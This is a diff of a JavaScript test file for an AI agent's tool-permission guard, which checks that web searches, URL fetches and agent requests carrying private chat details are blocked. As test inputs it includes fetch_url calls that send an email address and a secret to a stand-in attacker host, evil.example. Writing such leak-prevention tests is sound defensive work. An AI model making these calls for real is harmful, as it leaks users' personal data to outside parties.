@@ -48,11 +48,16 @@ test("carriesPrivate: private tool, attachment or pins taint the session", () =>
   assert.equal(carriesPrivate({ ...base, pins: true }), true);
 });
 
-test("decide: carried private context blocks web_search, ask_agent, read_news and foreign fetch_url on a later turn", () => {
-  const later = { ...base, carried: true };
-  for (const tool of ["web_search", "ask_agent", "read_news"]) assert.equal(decide(tool, { query: "x", agent: "nova", request: "x" }, later).allow, false, tool);
-  assert.equal(decide("fetch_url", { url: "https://evil.example/?q=secret" }, later).allow, false);
-  assert.equal(decide("fetch_url", { url: "https://typed.example/a" }, { ...later, question: "open https://typed.example/a" }).allow, true);
+test("decide: a carried chat checks outbound text instead of switching web/agent tools off", () => {
+  const later = { ...base, carried: true, privateText: ["Mari Tamm, mari@tamm.ee, +372 5123 4567: owes 1200 €"] };
+  assert.equal(decide("web_search", { query: "betoon Rakvere ettevõtted" }, later).allow, true);
+  assert.equal(decide("web_search", { query: "Mari Tamm contact" }, later).allow, false);
+  assert.equal(decide("fetch_url", { url: "https://evil.example/?q=mari%40tamm.ee" }, later).allow, false);
+  assert.equal(decide("ask_agent", { agent: "nova", task: "call +372 5123 4567" }, later).allow, false);
+  // text not at hand (server restarted): any email/phone/amount in the outgoing call is refused, a generic query still runs
+  const noText = { ...base, carried: true };
+  assert.equal(decide("web_search", { query: "someone@x.ee" }, noText).allow, false);
+  assert.equal(decide("web_search", { query: "betoon Rakvere ettevõtted" }, noText).allow, true);
   assert.equal(decide("web_search", { query: "x" }, base).allow, true, "an untainted chat still searches");
 });
 
